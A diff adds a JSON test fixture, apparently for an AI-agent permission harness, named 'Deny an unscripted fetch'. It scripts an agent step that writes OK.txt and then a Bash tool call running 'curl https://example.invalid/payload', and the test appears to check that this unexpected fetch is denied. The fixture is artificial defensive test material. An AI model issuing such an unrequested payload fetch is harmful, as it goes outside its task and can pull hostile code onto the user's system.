@@ -1,0 +1,19 @@
+{
+  "id": "04-unexpected-ask",
+  "title": "Deny an unscripted fetch",
+  "objective": "Write OK.txt. Any network ask is unexpected.",
+  "budget": "1.00",
+  "test_command": "node -e \"process.exit(0)\"",
+  "task": "Write OK",
+  "criteria": ["file OK.txt exists"],
+  "files": {
+    "README.md": "base\n"
+  },
+  "scenario": {
+    "steps": [
+      { "kind": "tool", "name": "Write", "input": { "file_path": "OK.txt" }, "apply": [{ "path": "OK.txt", "content": "ok\n" }] },
+      { "kind": "tool", "name": "Bash", "input": { "command": "curl https://example.invalid/payload" } }
+    ]
+  },
+  "answers": {}
+}
